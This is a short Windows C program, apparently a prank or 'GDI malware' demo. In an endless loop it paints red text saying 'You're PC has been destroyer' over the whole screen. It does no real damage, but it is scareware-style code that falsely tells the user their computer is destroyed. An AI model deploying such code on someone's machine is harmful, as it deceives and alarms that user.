#include <windows.h>

int main() {
    HDC hdc;
    int w, h;

    while (1) {  
        hdc = GetDC(0);
        w = GetSystemMetrics(SM_CXSCREEN);  
        h = GetSystemMetrics(SM_CYSCREEN);  


        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 0, 0));

        HFONT hFont = CreateFont(
            72, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
	        //100, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, TEXT("Arial")
        );
        SelectObject(hdc, hFont);

  
        RECT rect = { 0, h / 3, w, h };
        DrawText(
            hdc,
            TEXT("You're PC has been destroyer"),
            -1,
            &rect,
            DT_CENTER | DT_SINGLELINE
        );


        DeleteObject(hFont);
        ReleaseDC(0, hdc);
        Sleep(10);  //Sleep(500)
    }
    return 0;
}